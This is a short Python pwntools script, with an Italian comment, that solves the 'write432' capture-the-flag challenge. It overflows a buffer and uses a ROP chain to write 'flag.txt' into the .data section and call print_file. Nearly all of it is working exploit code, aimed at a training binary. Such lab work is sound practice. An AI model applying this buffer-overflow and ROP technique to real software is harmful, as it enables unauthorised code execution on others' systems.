from pwn import *

elf = ELF("./write432")

p = process("./write432")
p.recvuntil('> ')

"""
   Nell'esercizio seguente bisonga passare l'argomento 'flag.txt' alla funzione 'print_file'. Per fare ciò bisogna andare a scrivere 
   la stringa in una sezione del file scrivibile. Una volta trovata la sezione scrivibile (di solito .data lo è), andiamo ad utilizzare un 
   gadget nella forma mov [reg1], reg2, in questo modo andiamo a mettere l'indirizzo di memoria su reg1 e la stringa su reg2.
"""

mov_edi_ebp = p32(0x08048543)
pop_edi_ebp = p32(0x080485aa)
writable_area = 0x0804a018

payload = b''
payload += pop_edi_ebp + p32(writable_area) + b'flag' + mov_edi_ebp
payload += pop_edi_ebp + p32(writable_area+4) + b'.txt' + mov_edi_ebp 
payload += p32(elf.symbols['print_file']) + b'aaaa' + p32(writable_area)

p.send(cyclic(44) + payload)
					   

p.interactive()
